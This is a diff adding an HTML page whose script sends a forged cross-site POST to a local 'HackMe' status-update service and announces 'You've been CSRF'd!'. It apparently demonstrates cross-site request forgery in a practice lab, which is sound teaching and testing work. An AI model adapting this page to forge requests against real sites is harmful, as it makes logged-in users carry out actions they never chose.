@@ -1,0 +1,35 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title></title>
+    <link href="../Content/Site.css" rel="stylesheet" />
+    <script src="../scripts/js/jquery-1.10.2.js"></script>
+    <script type="text/javascript">
+
+        $(function () {
+
+            //START FROM HERE!
+            var status = "hacky hacky";
+
+            var dataIn = '{' + '"statusUpdate":"' + status + '"}';
+            $.ajax({
+                url: "http://localhost/WebSite/HackMe/StatusUpdateService.svc/UpdateStatus",
+                type: "POST",
+                contentType: "application/json; charset=utf-8",
+                data: dataIn,
+                dataType: "json",
+                success: function (data) {
+                    alert("Hacked");
+                },
+                error: function (error) {
+                    alert("Error: " + error.Error);
+                }
+            });
+
+        });
+    </script>
+</head>
+<body>
+    You've been CSRF'd!
+</body>
+</html>
